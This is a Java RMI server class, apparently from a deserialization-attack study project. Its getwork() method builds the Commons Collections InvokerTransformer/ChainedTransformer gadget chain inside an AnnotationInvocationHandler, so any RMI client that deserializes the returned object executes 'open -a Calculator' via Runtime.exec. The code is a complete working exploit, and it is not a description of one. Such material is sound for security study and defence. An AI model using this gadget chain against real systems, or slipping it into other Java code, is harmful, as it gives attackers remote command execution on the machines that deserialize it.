package SimpleRMI_3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Constructor;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;

public class UserImpl extends UnicastRemoteObject implements User {

    public UserImpl() throws RemoteException{
        super();
    }
    public String name(String name) throws RemoteException{
        return name;
    }
    public void say(String say) throws  RemoteException{
        System.out.println("you speak" + say);
    }
    public void dowork(Object work) throws  RemoteException{
        System.out.println("your work is " + work);
    }

    public Object getwork() throws RemoteException {
        Object evalObject = null;
        try {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[] {String.class, Class[].class},
                            new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[] {Object.class, Object[].class},
                            new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] {String.class},
                            new Object[] {"open -a Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "Threezh1");
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            evalObject = cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        }catch (Exception e){
            e.printStackTrace();
        }
        return evalObject;
    }
}